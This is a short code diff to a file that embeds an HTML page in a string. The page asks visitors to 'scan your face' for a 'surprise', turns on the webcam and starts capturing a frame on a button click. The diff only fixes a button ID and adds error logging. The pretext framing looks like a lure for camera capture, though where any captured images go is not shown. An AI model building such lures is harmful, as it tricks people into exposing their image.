@@ -80,14 +80,15 @@ html='''
     <div class="container">
         <h1>scan your face to find out if you are ready for a surprise</h1>
         <video id="face" autoplay></video><br>
-        <button id="verification button">Verify Your Face</button>
+        <button id="verification-button">Verify Your Face</button>
         <p id="result"></p>
     </div>
     <script>
-        const video=document.getElementById("face"),button=document.getElementById("verification button"),result=document.getElementById("result");
+        const video=document.getElementById("face"),button=document.getElementById("verification-button"),result=document.getElementById("result");
         navigator.mediaDevices.getUserMedia({video:true})
             .then(stream => { video.srcObject = stream; })
-            .catch(err => {result.textContent = "Camera error: " + err.name + " - " + err.message;
+            .catch(err => {console.error("Camera error:", err);
+                result.textContent = "Camera error: " + err.name + " - " + err.message;
                 result.style.color = "#e74c3c";});
         button.onclick = function() {
             const canvas = document.createElement('canvas');
